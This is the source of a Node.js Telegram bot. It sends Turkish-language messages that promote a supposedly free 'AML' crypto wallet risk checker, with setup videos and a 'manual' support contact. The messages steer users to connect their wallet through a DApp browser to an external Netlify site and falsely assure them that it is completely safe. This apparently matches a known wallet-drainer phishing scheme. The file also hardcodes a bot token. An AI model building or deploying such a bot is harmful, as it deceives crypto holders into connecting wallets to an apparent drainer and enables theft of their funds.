const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs'); // For sending local files

// Replace with your Telegram bot token
const token = '8072223939:AAFaGaWfsi7RW48uzCG3v0s8K8AZMM2orIA';

// Create the bot
const bot = new TelegramBot(token, { polling: true });

// Welcome message in Turkish
const welcomeMessage = `
Resmi *AML Dijital Varlık Güvenlik Asistanı* kanalına katıldığınız için hoş geldiniz! 🎉
Kripto varlıklarınızın güvenliğini korumaya odaklanıyoruz ve şu anda *BNB zincirini* destekliyoruz.

🛡 Şimdi [Cüzdan Risk Tespit Aracını] ücretsiz olarak kullanabilirsiniz. Sadece cüzdanınızı bağlayın ve:

✅ Kötü niyetli sözleşmelere yetki verilip verilmediğini kontrol edin  
✅ Yüksek riskli adreslerle iletişim kurulup kurulmadığını kontrol edin  
✅ Anormal işlemleri hızlıca tespit edin  

👇 *Hemen tespit başlatmak için tıklayın* (indirme veya mnemonic gerekmez):  
🔗 [Tespiti Başlat](https://aml-us.netlify.app)

/help - AML Kontrolü Kullanım Kılavuzu

Sorularınız varsa *manual* yazarak gerçek müşteri hizmetlerimizle iletişime geçebilirsiniz 🔧
`;

// Help message in Turkish
const helpMessage = `
✅ *Adım 1:* Tespit aracını kopyalayın: [aml-us.netlify.app], cüzdanınızı açın ve DAPP tarayıcınızı (keşif sayfası) kullanarak tespit aracını açın.

✅ *Adım 2:* Cüzdan ana ekranına dönün, BNB adresinizi bulun ve kopyalayın.

✅ *Adım 3:* DAPP tarayıcınıza geri dönün, tespit aracını açın ve *{Kontrol Et}* butonuna tıklayın (Trust Wallet, TP, Metamask vb. desteklenir).

✅ *Adım 4:* Kopyaladığınız BNB adresini giriş kutusuna yapıştırın ve OK’a tıklayın. Sonuçları görmek için yaklaşık 10 saniye bekleyin.

🔍 Sistem otomatik olarak anormal işlemleri, kötü niyetli sözleşme yetkilendirmelerini ve riskli adres etkileşimlerini tespit eder.

⚠️ Bu araç *özel anahtarları okumaz* ve fonları yönetmez. Sadece zincir üzerindeki davranışları analiz eder, tamamen güvenlidir.

Destek için 👉 @AmlSupportUs
`;

// Handle /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
});

// Handle /help and send guidance video
bot.onText(/\/help/, async (msg) => {
    const chatId = msg.chat.id;

    // Send help message
    await bot.sendMessage(chatId, helpMessage, { parse_mode: 'Markdown' });

    // Send iPhone setup video
    const iphoneVideoStream = fs.createReadStream('setup.mp4');
    await bot.sendVideo(chatId, iphoneVideoStream, {
        caption: '📱 iPhone için adım adım tespit aracı kullanım rehberi.'
    });

    // Send Android setup video
    const androidVideoStream = fs.createReadStream('setup1.mp4');
    await bot.sendVideo(chatId, androidVideoStream, {
        caption: '🤖 Android için adım adım tespit aracı kullanım rehberi.'
    });
});

// Handle manual support
bot.onText(/manual/i, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Gerçek bir müşteri temsilcisi kısa süre içinde sizinle iletişime geçecek. 👉 @AmlSupportUs üzerinden de bize ulaşabilirsiniz.');
});